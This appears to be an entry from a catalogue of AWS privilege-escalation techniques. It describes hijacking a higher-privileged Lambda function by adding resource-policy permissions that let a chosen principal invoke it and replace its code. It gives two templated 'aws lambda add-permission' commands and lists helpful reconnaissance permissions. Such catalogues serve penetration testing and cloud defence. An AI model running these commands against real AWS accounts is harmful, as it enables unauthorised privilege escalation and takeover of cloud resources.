---
description: |
    This escalation targets an existing lambda with higher privileges.

    The command modifies the permissions on the lambda to allow the provided principal to both modify the function code and invoke the new function.

    From this point, esclation continues as if you possessed **iam:UpdateFunctionCode** permissions.
details:
    AWS-CLI-command:
        - code: |
            aws lambda add-permission --function-name {target lambda} --statement-id {invoke statement name} --action lambda:InvokeFunction --principal {role or user arn}
            aws lambda add-permission --function-name {target lambda} --statement-id {update statement name} --action lambda:UpdateFunctionCode --principal {role or user arn}
    required-privileges:
        - code: |
            None
    required-configurations:
        - code: |
            An existing higher privilege lambda role.
    useful-privileges:
        - code: |
            iam:ListRoles
            iam:ListAttachedRolePolicies
            iam:GetPolicy
            lambda:ListFunctions
            lambda:GetFunction
    sources:
        - code: |
            Lucas Fedyniak-Hopes
---